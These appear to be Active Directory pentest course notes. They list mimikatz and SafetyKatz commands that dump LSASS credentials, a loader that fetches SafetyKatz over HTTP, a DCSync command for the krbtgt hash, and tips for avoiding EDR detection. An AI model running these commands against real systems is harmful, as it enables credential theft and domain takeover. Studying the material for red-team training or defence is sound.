### mimikatz
mimikatz can be used to extract credentials, tickets, replay credentials,
play with AD security and more.

Dump credentials
```powershell
mimikatz.exe -Command '"sekurlsa::ekeys"'
```

Using SafetyKatz (Minidump of lsass and PELoader to run mimikatz)
```powershell
Loader.exe -path C:\Users\Public\SafetyKatz.exe "sekurlsa::ekeys"
Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit
```

### DCSync
To extract credentials from the DC without code execution on it, we can
use DCSync

To use the DCSync feature for getting `krbtgt` hash execute the below
command with DA privileges for dcorp domain:
```powershell
Loader.exe SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```


Local Security Authority (`LSA`) is responsible for authentication on a Windows
machine. Local Security Authority Subsystem Service (`LSASS`) is its service.

`LSASS` stores credentials in multiple forms - NT hash, AES, Kerberos tickets and
so on.
- Credentials are stored by `LSASS` when a user:
- Logs on to a local session or RDP
- Uses RunAs
- Run a Windows service
- Runs a scheduled task or batch job
- Uses a Remote Administration tool

The `LSASS` process is therefore a very attractive target. It is also the most monitored process on a Windows machine.

**DONT TOUCH LSASS IF YOURE WORRIED ABOUT GETTING DETECTED**

Some of the credentials that can be extracted without touching `LSASS`.
- SAM hive (Registry) - Local credentials
-  `LSA` Secrets/SECURITY hive (Registry) - Service account passwords, Domain cached credentials etc. **NOT EVERY EDR WATCHES THE SECURITY HIVE**
- PowerShell console history
- DPAPI Protected Credentials (Disk) - Credentials Manager/Vault, Browser Cookies, Certificates, Azure Tokens etc.